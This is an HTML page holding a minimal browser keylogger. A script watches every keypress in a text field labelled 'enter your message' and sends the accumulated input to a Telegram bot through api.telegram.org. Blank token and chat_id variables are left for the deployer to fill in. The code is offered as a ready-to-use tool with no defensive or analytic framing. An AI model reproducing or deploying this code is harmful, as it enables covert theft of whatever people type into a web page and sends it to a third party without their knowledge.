<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form>
        <input type="text" id="keylogArea" name="keylogArea" placeholder="enter your message">
    </form>
    <script>
        //Enter your token and chat_id your telegram bot
        var token = "";
        var chat_id = "";
        keylogArea = document.getElementById("keylogArea");

        keylogArea.onkeypress = function (e) {
            keylogAreaTemp = keylogArea.value;
            keylogAreaTemp += e.key;
            console.log("Sent value: " + keylogAreaTemp);
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + keylogAreaTemp;
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        };

    </script>
    
</body>
</html>
